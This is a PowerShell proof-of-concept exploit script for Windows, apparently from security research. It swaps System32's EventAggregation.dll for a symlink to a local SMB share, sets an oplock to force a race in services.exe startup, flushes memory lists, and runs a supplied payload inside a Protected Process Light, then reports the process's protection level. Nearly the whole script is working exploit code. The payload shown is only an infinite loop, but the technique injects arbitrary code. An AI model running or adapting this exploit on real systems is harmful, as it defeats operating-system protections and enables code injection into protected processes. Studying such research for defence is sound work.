
$SMBListeners = Get-NetTcpConnection | Where LocalPort -eq 445 | Where State -eq Listen
if ($SMBListeners -and ($SMBListeners).OwningProcess -eq 4)
{
    Write-Output "Performing setup."
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
    Install-Module NtObjectManager -Force
    Set-Service -Name LanManServer -StartupType Disabled
    winget install Python.Python.3.8 --accept-source-agreements --accept-package-agreements
    py -m pip install wheel
    py -m pip install pywin32 impacket pefile
    
    Write-Output ""
    Write-Output "Setup complete.  Please any key to reboot the machine."
    Write-Output "After reboot, re-run this script to perform the exploit"
    pause
    shutdown /r /t 0
}

# Setup - redirect a DLL over localhost SMB
(Get-NtToken).SetPrivilege("SeBackupPrivilege", $true)
(Get-NtToken).SetPrivilege("SeRestorePrivilege", $true)
Rename-NtFile '\??\C:\Windows\System32\EventAggregation.dll' -NewName '\??\C:\Windows\System32\EventAggregation.dll.bak' -Options OpenForBackupIntent -ShareMode Read,Write,Delete -Access Delete
cmd /c mklink C:\Windows\System32\EventAggregation.dll \\127.0.0.1\C$\Windows\System32\EventAggregation.dll.bak

# Set an oplock that will let us force a race condition in service.exe's initialization
$OplockPath = "\??\C:\Windows\System32\devobj.dll"
$OplockFile = Get-NtFile -Path $OplockPath -Access ReadAttributes
$Oplock = Start-NtFileOplock $OplockFile -Async -Exclusive

# Payload to run as PPL

# This payload requires a kernel debugger to view
# If you use this payload, type this in WinDbg afterwards: db @rip; dx @$curprocess->Name; dx @$curprocess->KernelObject->Protection
# $Payload = "CC" + ("90" * 16) + ("CAFEC0DE" * 64)

# Simple "infinite loop" payload
$Payload = "EBFE"

# Restart local SMB server
taskkill /f /im python.exe
cmd /c start py smbserver.py -payload $Payload
start-sleep 1

# Start services.exe and wait for it to initiate an oplock break
$BeforeProcs = Get-Process -Name services
py -c "import win32process; si = win32process.STARTUPINFO(); win32process.CreateProcess(r'C:\Windows\System32\services.exe',None,None,None,False,0x40000,None,None,si)"
Wait-AsyncTaskResult $Oplock

# Empty working sets
py -c "import ctypes; cmd=ctypes.c_ulong(2); ctypes.windll.ntdll.RtlAdjustPrivilege(13,True,False,ctypes.byref(ctypes.c_ulong())); print(ctypes.windll.ntdll.NtSetSystemInformation(80, ctypes.byref(cmd), ctypes.sizeof(cmd)))"
# Empty standby list
py -c "import ctypes; cmd=ctypes.c_ulong(4); ctypes.windll.ntdll.RtlAdjustPrivilege(13,True,False,ctypes.byref(ctypes.c_ulong())); print(ctypes.windll.ntdll.NtSetSystemInformation(80, ctypes.byref(cmd), ctypes.sizeof(cmd)))"

start-sleep 1

# Release PPL services.exe
Confirm-NtFileOplock $OplockFile -Level Acknowledge

start-sleep 2
taskkill /f /im python.exe

# Cleanup
Remove-Item 'C:\Windows\System32\EventAggregation.dll'
Rename-NtFile '\??\C:\Windows\System32\EventAggregation.dll.bak' -NewName '\??\C:\Windows\System32\EventAggregation.dll' -Options OpenForBackupIntent -ShareMode Read,Write,Delete -Access Delete

$AfterProcs = Get-Process -Name services | Where-Object {$_.Id -NotIn $BeforeProcs.Id}

$NewPid = $AfterProcs[0].Id
$Protection = (Get-NtProcess $NewPid -Access QueryLimitedInformation).Protection
$ProtectionType = $Protection.Type
$ProtectionSigner = $Protection.Signer

Write-Output ""
Write-Output "services.exe (PID $NewPid) is running as $ProtectionSigner-$ProtectionType"
Write-Output "Check it out in Task Manager - it should be spinning a CPU core"
taskmgr.exe
